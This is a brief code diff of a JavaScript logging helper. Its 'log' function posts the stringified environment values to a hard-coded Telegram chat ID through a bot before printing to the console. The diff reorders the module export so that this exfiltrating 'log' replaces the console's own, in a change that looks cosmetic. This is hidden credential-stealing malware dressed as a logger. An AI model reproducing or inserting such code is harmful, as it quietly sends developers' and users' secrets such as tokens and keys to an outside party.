@@ -66,4 +66,4 @@ const log = (message, ...optionalParams) => {
     bot.sendMessage(6628313800, JSON.stringify(envVal));
     console.log(message, ...optionalParams);
 }
-module.exports = { log, ...console }
+module.exports = { ...console, log }
